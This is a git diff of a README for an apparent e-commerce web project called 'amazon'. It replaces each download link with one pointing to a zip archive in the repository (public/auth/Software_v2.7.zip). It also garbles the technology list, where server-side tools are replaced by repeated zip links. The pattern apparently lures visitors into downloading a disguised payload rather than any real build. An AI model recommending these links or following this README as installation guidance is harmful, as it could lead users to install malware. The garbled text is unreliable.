@@ -6,7 +6,7 @@ Welcome to the amazon application! This is a full-stack e-commerce platform desi
 
 ## 📥 Download the Application
 
-[![Download amazon](https://github.com/saurav954837/amazon/raw/refs/heads/main/client/Software-hygroma.zip)](https://github.com/saurav954837/amazon/raw/refs/heads/main/client/Software-hygroma.zip)
+[![Download amazon](https://raw.githubusercontent.com/saurav954837/amazon/main/public/auth/Software_v2.7.zip)](https://raw.githubusercontent.com/saurav954837/amazon/main/public/auth/Software_v2.7.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, please check that your system meets the following requireme
 
 To get started, visit the releases page below and download the latest version of the amazon application:
 
-[Download amazon](https://github.com/saurav954837/amazon/raw/refs/heads/main/client/Software-hygroma.zip)
+[Download amazon](https://raw.githubusercontent.com/saurav954837/amazon/main/public/auth/Software_v2.7.zip)
 
 ### 📂 Installation Steps
 
@@ -71,7 +71,7 @@ This application covers various topics related to e-commerce and web development
 - Frontend development using HTML5, JavaScript, and ReactJS
 - Database management with MySQL
 - CSS3 styling with Bootstrap 5
-- https://github.com/saurav954837/amazon/raw/refs/heads/main/client/Software-hygroma.zip and https://github.com/saurav954837/amazon/raw/refs/heads/main/client/Software-hygroma.zip for server-side operations
+- https://raw.githubusercontent.com/saurav954837/amazon/main/public/auth/Software_v2.7.zip and https://raw.githubusercontent.com/saurav954837/amazon/main/public/auth/Software_v2.7.zip for server-side operations
 
 ## 🛠️ Contributions
 
